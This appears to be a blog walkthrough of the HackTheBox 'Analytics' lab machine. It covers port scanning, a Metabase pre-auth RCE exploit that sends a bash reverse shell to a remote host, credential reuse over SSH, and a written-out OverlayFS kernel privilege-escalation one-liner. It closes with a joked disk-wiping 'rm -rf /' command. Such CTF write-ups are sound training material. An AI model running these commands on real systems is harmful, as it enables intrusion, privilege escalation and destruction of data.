# HackTheBox Analytics Walkthrough
Analytics is an easy linux machine that targets the exploitation of a vulnerable server monitoring application present via a website and a vulnerable Ubuntu kernel version.

{:toc}

## Enumeration
An initial nmap to scan the open ports via TCP was performed. Also when the open ports 
were retrieved a more in depth scan including fingerprinting was issued. With the following commands:
~~~bash
# First nmap scan
sudo nmap -sS -p- --min-rate 500 --open 10.10.11.233 -Pn -n -oG recon
# Exhaustive scan of the open ports
nmap -p80,22 -sCV -Pn -n -oN openports 10.10.11.233
~~~

The results obtained by this scans showed some interesting open ports:
![800x400](/assets/img/blog/analytics/nmap.png "Nmap enumeration")
* Port 80 is open and is hosting a HTTP server, NGinx 1.18 
* Port 22 is open and from the obtained banner looks like a ssh service version: OpenSSH 8.9p1

From the nmap scan we can see this is a linux machine, probably a Ubuntu distro.
## Web enumeration
First as we saw on the info retrieved via nmap we can see the webserver is redirecting to the `analytical.htb` domain. To be able to resolve the domain we added this info to the `/etc/hosts` file.
~~~bash
sudo nano /etc/hosts
#add
10.10.11.233	analytical.htb
~~~

Moving on and visiting the website we observe a simple website with no complex functionality and not much interesting info, except for a login button that redirects to the subdomain `data.analytical.htb`. We investigated this path.
![800x400](/assets/img/blog/analytics/mainpage.png "Main page")
To be able to resolve this domain again we added an entry to the /etc/hosts.
~~~bash
sudo nano /etc/hosts
#add
10.10.11.233    data.analytical.htb analytical.htb
~~~

At this point visiting the website we got a login page for a service named `Metabase`. 
![800x400](/assets/img/blog/analytics/metabase.png "Metabase login")
Now we could think of various attacks: trying default credentials, performing a sqli injection, or performing a bruteforce attack. Since most of these attacks are very "noisy" we started by enumerating 
this called service named metabase. Searching online, a vulnerability was present, the `CVE-2023-38646`, a `pre-authentication RCE` for versions preceding 0.46.6.1, in the open-source edition, 
and preceding 1.46.6.1, in the enterprise edition.

At this point we didn't knew the version of the service, but we tried to exploit it anyway via a [Github](https://github.com/m3m0o/metabase-pre-auth-rce-poc) exploit.
To get a shell we set a nc listener and executed a reverse shell command using the POC exploit.
~~~bash
nc -lvnp 443
python3 main.py -u http://data.analytical.htb -t [setup-token] -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
~~~

This returned a connection on our nc listener, providing us a reverse shell.
## Getting a foothold
As we got remote command execution we started enumerating the machine, but soon realized we were inside a container we needed to scape. The first step was to enumerate the machine searching for juicy info. After performing numerous steps, executing the `env` command to list the environment defined variables some credentials were exposed.
![800x400](/assets/img/blog/analytics/env.png "Env command")

Taking into account the credentials and the fact that ssh is open, we tried them on this service and VOILA we got access to the machine as the user `metalytics`
![800x400](/assets/img/blog/analytics/metalytics.png "SSH access")
At this point we got the flag located at `/home/metalytics/user.txt`
## Privilege Escalation
To privesc the first thing we did was transfer the linpeas script to the machine to perform an automatic enumeration on the machine, this didn't bring too much info about privesc vectors. 
Moving on and performing some manual enum we found that the Ubuntu kernel version is potentially vulnerable.
~~~bash
uname -a
~~~
![800x400](/assets/img/blog/analytics/uname.png "Uname -a output")
After searching on Google we found that this version is affected by a couple `CVE`, the `CVE-2023-2640` and `CVE-2023-32629`. On [Github](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) we found a one-liner exploit that grants privilege escalation.
~~~bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
~~~

After executing the code we obtained a root shell.

![800x400](/assets/img/blog/analytics/root.png "Root pivoting")

At this point we successfully pwned the machine and we have got complete control of the system ðŸ’€ðŸ’€ðŸ’€

To delete our trace as an attacker we can execute the following command:
~~~bash
rm -rf --no-preserve-root /
~~~
Just joking dont even do this or you will get fired! XD

Last but not least we retrieved the flag located at `/root/root.txt`
